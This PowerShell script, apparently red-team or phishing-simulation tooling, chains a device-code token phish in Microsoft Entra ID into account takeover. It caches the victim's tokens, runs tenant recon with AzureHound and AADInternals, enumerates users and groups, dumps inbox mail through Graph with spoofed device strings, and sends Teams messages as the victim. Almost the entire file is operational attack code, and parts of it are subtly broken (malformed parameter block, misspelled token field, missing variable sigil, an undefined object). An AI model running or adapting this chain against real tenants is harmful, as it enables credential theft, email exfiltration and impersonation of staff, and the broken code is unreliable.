[CmdletBinding()]
param (
    [Parameter(ValueFromPipeline=$true)]
    [string]$user,
    [Parameter(ValueFromPipeline=$true)]
    [string]$domain.
    [Parameter(ValueFromPipeline=$true)]
    [string]$teamsUser.
    [Parameter(ValueFromPipeline=$true)]
    [string]$teamsMessage
)
if (-not (Get-Module -Name AADInternals -ListAvailable)) { Write-Output "Importing AADInternals";
    Import-Module AADInternals
}
if (-not (Get-Module -Name TokenTactics -ListAvailable)) { Write-Output "TokenTactics not found, importing V2 fork from project folder";
    Import-Module .\TokenTacticsV2\TokenTactics.psd1
}


if(!($domain)){ Write-Output "Please specify target domain"; $domain = Read-Host; Write-Output "$domain selected" }
if(!($user)){ Write-Output "Please specify target user"; $user = Read-Host; Write-Output "$user selected" } 

Get-AzureToken -Client Graph

if(!($response)){ Read-Host "User didn't bite, try again."} else {
$access = $response.acess_token
$refresh = $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

$acc = Read-AADIntAccessToken $access
$user = $acc.upn
Write-Output "$user took the bait."

# recon
# Connect-AzureAD -AadAccessToken $response.access_token -AccountId $user
$tok = $response.refresh_token
.\azurehound\azurehound.exe -r $tok list --tenant $domain -o .\azurehound.json 

# AAdInternals recon
$core=RefreshTo-AzureCoreManagementToken -domain $domain
Add-AADIntAccessTokenToCache -AccessToken $core.access_token -RefreshToken $core.refresh_token 
$results = Invoke-AADIntReconAsInsider
$results > recon.json

# users and groups
$users = Invoke-AADIntUserEnumerationAsInsider
$users > UserEnumeration.json

# Users
# Retrieve all users
$users = Get-AzureADUser -All $true
$users > users.json

# AzAD Group memberships
Connect-AzureAD -AadAccessToken $response.access_token -AccountId $user

# Retrieve all groups
$groups = Get-AzureADGroup -All $true
$groups > groups.json

# Create an empty array to store group and member information
$groupData = @()

# Iterate over each group and retrieve its members
foreach ($group in $groups) {
    $groupInfo = [ordered]@{
        GroupName = $group.DisplayName
        Members = @()
    }

    # Retrieve members of the group
    $members = Get-AzureADGroupMember -ObjectId $group.ObjectId -All $true

    # Add members to group info
    foreach ($member in $members) {
        $groupInfo.Members += $member.DisplayName
    }

    # Add group info to the array
    $groupData += $groupInfo
}

# Convert the group data to JSON
$jsonData = $groupData | ConvertTo-Json

# Save the JSON data to a file
$jsonData | Out-File -FilePath "members.json"

# Attempt CAE token
RefreshTo-MSGraphToken -UseCAE -Domain $domain
if ( $global:MSGraphTokenValidForHours -gt 23) { "MSGraph token is CAE capable, token is good for 24 hours. For more information: https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-continuous-access-evaluation " }


# Email
# dump emails via graph with tokentactics
RefreshTo-MSGraphToken -refreshtoken  $response.refresh_token -domain $domain -Device iPhone -Browser Safari
Add-AADIntAccessTokenToCache -AccessToken $outlook.access_token -RefreshToken $outlook.refresh_token
Dump-OWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox -top 200 -Device iPhone -Browser Safari >> $user.json

# Open in browser with Burp
RefreshTo-SubstrateToken -refreshToken $response.refresh_token -domain $domain -Device AndroidMobile -Browser Android
Open-OWAMailboxInBrowser -AccessToken $SubstrateToken.access_token -Device Mac -Browser Chrome

# Get Teams Token and export for AADInternals
$teams=RefreshTo-MSTeamsToken -refreshToken $response.refresh_token -domain $domain
Add-AADIntAccessTokenToCache -AccessToken $teams.access_token -RefreshToken $teams.refresh_token


# Set-AADIntTeamsStatusMessage -Message "My cool status message" -AccessToken $MSTeamsToken.access_token -Verbose
if(!(teamsMessage)){ $teamsMessage = "$user has taken the bait in a phishing simulation. This message is to simulate an attacker taking control of the account. Please follow up with your IT security team."}
if($teamsUser) { Send-AADIntTeamsMessage -Recipients $teamsUser -Message $teamsMessage } else { Write-Output "Skipping the Teams message."}

# Get Messages
Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName

Write-Output "Use Get-AADIntTeamsMessages for more detail"
}